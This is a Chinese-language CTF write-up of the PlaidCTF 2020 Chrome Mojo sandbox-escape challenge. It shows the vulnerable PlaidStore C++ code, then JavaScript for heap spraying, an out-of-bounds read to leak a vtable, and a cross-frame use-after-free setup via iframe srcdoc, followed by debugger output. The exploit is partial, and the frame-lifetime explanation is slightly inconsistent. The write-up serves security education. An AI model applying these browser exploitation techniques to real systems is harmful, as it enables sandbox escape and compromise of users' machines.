---
title: 沙箱逃逸之 plaidctf 2020 mojo writeup
contest: PlaidCTF
year: 2020
difficulty: hard
vuln_type: misc_unknown
tags: [Chrome-sandbox-escape, Mojo-binder, RenderFrameHost, PlaidStore-impl, IsRenderFrameLive, IPC, JavaScript, UAF, OOB-read, vtable-leak]
attack_chain:
  - Chrome headless + MojoJS + MojoJSTest + 远程调试 1338 端口
  - PlaidStore mojo 接口: StoreData(key, array) + GetData(key, count) => (array)
  - IsRenderFrameLive() 检查：返回时虚表指针 + render_frame_host_ 悬空指针
  - pwn.html 加载 mojo_bindings.js + plaidstore.mojom.js
  - 漏洞: getData(key, count) 中 count 可控，vector 越界读
  - 利用: 0x200 次 storeData("xxxxx", new Uint8Array(0x28).fill(0x41)) 堆喷射
  - 收集 plaidStorePtrList，调用 getData(0x2000) 越界读
  - 越界读提取 vtable 地址（0x28/8 偏移）
  - UAF: 在子 frame 创建 PlaidStorePtrs，父 frame 跨 frame 引用触发 UAF
  - 双 frame 技巧: addFrame() 创建 iframe + srcdoc 注入 uaf() 脚本
  - pwndbg: frame #0 operator new + 堆内存检查
key_payload: 'mojo JS PlaidStore.getRemote + storeData 堆喷射 0x200 + getData(0x2000) 越界 + 跨 frame UAF'
one_liner: PlaidCTF 2020 mojo：Chrome 沙箱逃逸，Mojo PlaidStore 接口 IsRenderFrameLive 悬空指针 + 越界读 OOB + 跨 frame UAF。
lesson: Chrome Mojo 接口的 RenderFrameHost 悬空指针是经典沙箱逃逸向量；跨 frame 引用是 UAF 触发器。
quality: high
---

# 沙箱逃逸之 plaidctf 2020 mojo writeup

**来源**: ctfiot.com ID 85249

## 题目环境
- Chrome headless + MojoJS + MojoJSTest + 远程调试端口 1338
- 出题补丁：plaidstore.diff 添加 PlaidStore mojo 接口

## PlaidStore 接口
```cpp
module blink.mojom;
interface PlaidStore {
  StoreData(string key, array data);
  GetData(string key, uint32 count) => (array data);
};
```

## 关键 C++ 实现
```cpp
class PlaidStoreImpl : public blink::mojom::PlaidStore {
 public:
  void StoreData(const std::string& key, const std::vector<uint8_t>& data) override {
    if (!render_frame_host_->IsRenderFrameLive()) return;
    data_store_[key] = data;
  }

  void GetData(const std::string& key, uint32_t count, GetDataCallback callback) override {
    if (!render_frame_host_->IsRenderFrameLive()) {
      std::move(callback).Run({});
      return;
    }
    auto it = data_store_.find(key);
    if (it == data_store_.end()) {
      std::move(callback).Run({});
      return;
    }
    std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
    std::move(callback).Run(result);
  }

 private:
  RenderFrameHost* render_frame_host_;
  std::map<std::string, std::vector<uint8_t>> data_store_;
};
```

### 漏洞
- `GetData` 中 `count` 可控，无上界检查
- 越界读 `it->second.begin() + count` 读取超出 vector 边界

## 利用链

### Step 1: 初始化
```bash
./chrome --headless --disable-gpu --remote-debugging-port=1338 \
  --enable-blink-features=MojoJS,MojoJSTest pwn.html
```

### Step 2: 加载 mojo 绑定
```html
<script src="./mojo/public/js/mojo_bindings.js"></script>
<script src="./third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
<script>
async function test() {
  let p = blink.mojom.PlaidStore.getRemote(true);
  await p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41));
}
test();
</script>
```

### Step 3: 堆喷射 + 越界读
```javascript
async function Leak() {
  let plaidStorePtrList = [];
  for (let i = 0; i < 0x200; i++) {
    let p = blink.mojom.PlaidStore.getRemote(true);
    await p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41));
    plaidStorePtrList.push(p);
  }
  let p = plaidStorePtrList[0];
  let leakData = (await p.getData("xxxxx", 0x2000)).data;
  // 提取 vtableAddr ...
}
```

### Step 4: 跨 frame UAF
```javascript
function AddFrame() {
  let frame = document.createElement("iframe");
  frame.srcdoc = `
    <script src="mojo/public/js/mojo_bindings_lite.js"></script>
    <script src="third_party/blink/public/mojom/plaidstore/plaidstore.mojom-lite.js"></script>
    <script>
      async function uaf() {
        let plaidStorePtrList = [];
        for (let i = 0; i < 0x200; i++) {
          let p = blink.mojom.PlaidStore.getRemote(true);
          await p.storeData("xxxxx", new Uint8Array(0x28).fill(0x41));
          plaidStorePtrList.push(p);
        }
        window.plaidStorePtrList = plaidStorePtrList;
      }
      uaf();
    </script>
  `;
  document.body.appendChild(frame);
  return frame;
}
```

## pwndbg 调试
```
#0 0x000055555ac584b0 in operator new(unsigned long, std::nothrow_t const&) ()

pwndbg> x/6gx 0x284976549f30
0x284976549f30: 0x000055555f50a7a0    0x000028497640bd00  ; vtable | render_frame_host_
0x284976549f40: 0x00002849765f5b40    0x00002849765f5b40  ; data_store_

pwndbg> vmmap 0x284976549f30
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x28497627a000 0x284976979000 rw-p 6ff000 0 +0x2cff30
```

## 关键技术
- **Mojo IPC**：Chrome 的进程间通信机制
- **RenderFrameHost 悬空指针**：父 frame 销毁后子 frame 仍引用
- **跨 frame 引用 UAF**：父 frame 持有子 frame 创建的 PlaidStorePtrs
- **越界读 vtable**：count=0x2000 读取超出 vector 边界拿到 vtable 地址
- **堆喷射**：0x200 次 storeData 填充稳定结构

## 评价
PlaidCTF 2020 经典 Chrome 沙箱逃逸题。考察：
- Chrome Mojo JS API
- RenderFrameHost 生命周期
- 跨 frame 引用 UAF
- OOB read
- vtable leak

是浏览器安全研究的高级实战案例。
